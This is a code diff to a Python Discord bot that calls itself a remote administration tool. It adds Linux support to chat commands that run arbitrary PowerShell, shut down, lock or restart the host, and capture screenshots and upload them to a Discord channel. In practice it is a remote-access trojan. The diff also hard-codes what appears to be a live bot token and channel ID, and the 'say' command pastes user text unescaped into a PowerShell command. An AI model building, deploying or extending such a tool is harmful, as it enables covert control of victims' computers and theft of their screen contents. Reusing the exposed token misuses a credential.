@@ -14,12 +14,18 @@ import time
 # Dependency of screenshot
 from mss import mss
 
+# For using commands in different systems
+from helpers import get_operating
+
+# Platform name 
+operating_sys = get_operating()
+
 # Here you can modify the bot's prefix and description and wether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
 # Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token Here'
-CHANNEL_ID = 'Enter Channel ID here'
+BOT_TOKEN = 'NDk3MDg1MzkyODYwNzQxNjQ4.DpaCrA.3P7mKaOGdxD28rK5luDpyaKG50s'
+CHANNEL_ID = '347152989296787459'
 
 @client.event
 async def on_ready():
@@ -56,10 +62,12 @@ async def cmd(cmnd):
 # Dependencies: time, os
 @client.command()
 async def powershell(cmnd):
-	await client.say("Executing in powershell: " + cmnd)
-	os.system("powershell {}".format(cmnd))
+	if operating_sys == "Windows":
+		await client.say("Executing in powershell: " + cmnd)
+		os.system("powershell {}".format(cmnd))
+	else:
+		await client.say("Powershell is only available in Windows")
 	await asyncio.sleep(3)
-
 
 # Module: lock
 # Description: Locks system
@@ -70,7 +78,13 @@ async def lock(seconds = 0):
 	await client.say("Locking system.")
 	if time != 0:
 		time.sleep(seconds)
-	os.system("rundll32.exe user32.dll,LockWorkStation")
+	if operating_sys == "Windows":
+		os.system("rundll32.exe user32.dll,LockWorkStation")
+	elif operating_sys == "Linux":
+		os.popen('gnome-screensaver-command --lock')
+	else:
+		await client.say("Can't lock system.")
+		await asyncio.sleep(3)
 
 
 # Module: sleep
@@ -79,10 +93,14 @@ async def lock(seconds = 0):
 # Dependencies: time, os
 @client.command()
 async def sleep(seconds = 0):
-	await client.say("Putting system to sleep.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+	if operating_sys == "Windows":
+		await client.say("Putting system to sleep.")
+		if time != 0:
+			time.sleep(seconds)
+		os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+	else:
+		await client.say("Can't put system to sleep.")
+		await asyncio.sleep(3)
 
 
 # Module: shutdown
@@ -92,9 +110,18 @@ async def sleep(seconds = 0):
 @client.command()
 async def shutdown(seconds = 0):
 	await client.say("Shutting system down.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -s -t 0")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -s -t 0")
+	elif operating_sys == "Linux":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("shutdown")
+	else:
+		await client.say("Can't shutdown system.")
+		await asyncio.sleep(3)
+
 
 
 # Module: restart
@@ -104,9 +131,17 @@ async def shutdown(seconds = 0):
 @client.command()
 async def restart(seconds = 0):
 	await client.say("Restarting system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -r")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -r")
+	elif operating_sys == "Linux":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("reboot")
+	else:
+		await client.say("Can't restart system.")
+		await asyncio.sleep(3)
 
 
 # Module: hibernate
@@ -116,9 +151,13 @@ async def restart(seconds = 0):
 @client.command()
 async def hibernate(seconds = 0):
 	await client.say("Hibernating system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("rundll32.exe PowrProf.dll,SetSuspendState")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("rundll32.exe PowrProf.dll,SetSuspendState")
+	else:
+		await client.say("Can't hibernate system.")
+		await asyncio.sleep(3)
 
 
 # Module: logoff
@@ -128,9 +167,14 @@ async def hibernate(seconds = 0):
 @client.command()
 async def logoff(seconds = 0):
 	await client.say("Logging out of system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -l")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -l")
+	else:
+		await client.say("Can't logoff system.")
+		await asyncio.sleep(3)
+	
 
 
 # Module: screenshot
@@ -146,7 +190,10 @@ async def screenshot(seconds = 0):
 		time.sleep(seconds)
 	with mss() as sct:
 		filename = sct.shot(mon=-1, output='screenshot.png')
-	await client.send_file(client.get_channel(CHANNEL_ID),'screenshot.png')
+	try:
+		await client.send_file(client.get_channel(CHANNEL_ID),'screenshot.png')
+	except:
+		await client.say("An error occurred.")
 
 
 # Module: say
@@ -155,8 +202,11 @@ async def screenshot(seconds = 0):
 # Dependencies: time, os
 @client.command()
 async def say(txt):
-	await client.say("Saying: " + txt)
-	os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
+	if operating_sys == "Windows":
+		await client.say("Saying: " + txt)
+		os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
+	else:
+		await client.say("Can't use TTS")
 	await asyncio.sleep(3)
 
 client.run(BOT_TOKEN)
